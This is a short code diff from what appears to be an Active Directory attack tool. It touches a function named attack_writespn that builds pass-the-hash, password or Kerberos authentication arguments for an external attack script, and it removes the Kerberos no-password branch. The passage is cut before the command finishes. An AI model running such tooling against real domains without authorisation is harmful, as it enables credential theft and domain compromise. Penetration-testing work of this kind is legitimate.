@@ -20,8 +20,6 @@ def attack_writespn(session):
         auth = f"-u '{session.username}' -p :{session.hash}'"
     elif session.password:
         auth = f"-u '{session.username}' -p '{session.password}'"
-    else:
-        auth = f"-u '{session.username}' -k --no-pass --dc-ip {session.dc_ip}"
 
     cmd = (
         f"python3 {tool_path} -v -d '{session.domain}' {auth} "
